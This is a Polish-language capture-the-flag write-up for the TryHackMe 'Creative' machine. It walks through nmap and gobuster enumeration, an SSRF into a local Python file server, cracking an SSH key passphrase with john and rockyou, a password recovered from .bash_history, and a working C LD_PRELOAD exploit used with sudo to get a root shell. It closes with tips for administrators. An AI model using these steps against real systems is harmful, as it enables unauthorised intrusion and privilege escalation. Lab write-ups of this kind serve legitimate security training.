@@ -1,0 +1,124 @@
+# Creative
+Hacker: hubert
+
+Cel: Test penetracyjny, sprawdzanie zabezpieczenia
+
+IP i porty:10.10.137.10 ; 22,80
+
+Znaleziona poddomena pozwolila na wykonanie ataku SSRF (Server Site Request Forgery) dzieki ktoremu moglismy otrzymac klucz do uzytkownika  "saad"
+
+Haslo zostalo zlamane przy uzyciu listy slow rockme.txt (/usr/share/wordlist/rockyou.txt na kali linux)
+
+Dostepny plik .bash_history w katalogu domowym uzytkownika saad mamy jego haslo oraz mozliwosc do eskalacji uprawnien
+
+Napisany exploit w jezyku C pozolil na eskalacje uprawnien na root oraz calkowicie skompromitowac system
+
+## nmap
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)
+|   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)
+|_  256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://creative.thm
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone
+Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%), Google Android 10.X (91%)
+OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:google:android:10 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5
+
+## beta.creative.thm
+Na tej poddomenie widnieje URL beta checker ktory sprawdza czy dana strona dziala 
+
+Za kazdym razem wyswietla sie "Dead" pomimo wpisywania dzialajacej strony
+
+kiedy wpiszemy http://127.0.0.1:1337/ wyswietla sie okienko wybierania folderow i plikow (python3 -m http.server ma taki sam interfejs)
+
+Dzieki czemu mozemy dowiedziec sie o fladze uzytkownika a takze otrzymac ssh do uzytkownika saad
+
+## Poddomeny
+Jako iz maszyna jest dostepna na TryHackMe musimy dodac strone do /etc/hosts wraz z ip i dopiero wtedy mozemy szukac poddomen
+
+Kazda kolejna znaleziona poddomene dodajemy do ip do ktorego mamy przypisane domene 
+
+gobuster vhost -u http://creative.thm/ -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt --append-domain -t 100
+
+Found: beta.creative.thm Status: 200 [Size: 591]
+
+
+## Johntheripper
+Potrzebujemy dodatkowego klucza aby zalogowac sie na ssh wiec uzyjemy 2 narzedzi do tego
+
+ssh2john - konwertuje klucz ssh aby john byl w stanie zlamac haslo
+john - lamacz hasel
+
+najpierw konwertujemy 
+
+ssh2john id_rsa > hash.txt
+
+Teraz john
+
+john --wordlist=/home/hubert/Desktop/rockyou.txt hash.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+sweetness        (id_rsa)
+
+## shh
+cat .bash_history 
+
+whoami
+pwd
+ls -al
+ls
+cd ..
+sudo -l
+echo "saad:MyStrongestPasswordYet$4291" > creds.txt
+rm creds.txt
+sudo -l
+whomai
+whoami
+
+z haslem mamy dostep do komendy sudo -l a w niej
+
+[sudo] password for saad: 
+Matching Defaults entries for saad on m4lware:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    env_keep+=LD_PRELOAD
+
+User saad may run the following commands on m4lware:
+    (root) /usr/bin/ping
+
+
+
+
+## Eskalacja uprawnien
+Korzystajac z  env_keep+=LD_PRELOAD w sudo -l mozemy w C napisac nasza droge do eskalacji uprawnien do roota
+
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/sh");
+}
+
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+
+po wpisaniu komendy na gorze wpisujemy
+
+sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping i haslo do uzytkownika saad i mamy root
+
+## Porady dla administratora
+1. Ustawienie w katalogu uzytkownika aby wpisane rzeczy w .bash_history trafialy do 2>/dev/null
+2. Ustawienie trudniejszego hasla (Minimum 14 znakow) na klucz ssh
+3. Wylaczenie servera http w pythonie aby uniknac SSRF
+
